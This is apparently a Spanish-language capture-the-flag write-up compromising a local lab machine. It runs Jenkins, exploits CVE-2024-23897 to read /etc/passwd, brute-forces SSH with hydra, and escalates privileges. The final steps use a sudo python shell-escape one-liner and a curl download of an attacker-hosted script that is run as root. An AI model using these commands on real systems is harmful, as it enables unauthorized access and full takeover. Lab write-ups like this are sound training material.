# Info
## IP Víctima
```
172.17.0.2
```
## SSH creds
### Usuario
```
bobby
```
### Pass
```
chocolate
```
# Writeup
## Nmap
En primer lugar lanzamos un nmap para identificar puertos abiertos, servicios y versiones.
``` 
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 94:fb:28:59:7f:ae:02:c0:56:46:07:33:8c:ac:52:85 (ECDSA)
|_  256 43:07:50:30:bb:28:b0:73:9b:7c:0c:4e:3f:c9:bf:02 (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(10.0.18)
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.08 ms 172.17.0.2

```
El escáner revela un servidor HTTP corriendo en el puerto 8080 mediante Jetty y un OpenSSH. Investigando un poco sobre Jetty leo sobre vulnerabilidades de XSS e inyección comunes en versiones más antiguas, pero no encuentro ningún exploit concreto que se pueda usar, por lo que visito la web a ver que encontramos. 
El puerto 8080 revela un login de Jenkins, hago un fuzzeo rápido antes de probar cualquier otra cosa y veo que hay un subdirectorio /people que no requiere auth, y dentro veo que hay un perfil de nombre admin. Voy a probar a hacer un ataque diccionario al panel de login con el username 'admin'.
## FF 
Después de un rato dándole vueltas veo un writeup de Pylon, en el que utiliza WhatWeb para ver la versión de Jenkins que está corriendo. En la versión del lab hay una vulnerabilidad de LFS. Me bajo el exploit y gracias a la vulnerabilidad [[CVE-2024-23897]]  puedo leer el contenido de /etc/passwd, archivo que revela la existencia de un usuario 'bobby', al cual vamos a atacar mediante SSH por diccionario. Sacamos la contraseña con hydra y pasamos a postexplotación
## Post explotación
Un `sudo -l` revela que lo siguiente `(pinguinito) NOPASSWD: /usr/bin/python3` con lo cual solo queda lanzar un 
``` bash
sudo python -c 'import os; os.system("/bin/sh")'
```
y ganar acceso al usuario pinguinito. Una vez dentro de este lanzo sudo -l de nuevo y veo lo siguiente: `(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py`  pero no hay nano en la máquina. Borro el archivo de la carpeta y despues de crear un script.py en mi propia máquina lo sirvo en http con python, entonces, desde la máquina victima lo descargo con `curl -O http://192.168.1.157:8081/script.py` una vez mi script ya esta dentro simplemente lanzo `sudo -u root /usr/bin/python3 /opt/script.py` y ya soy root.
 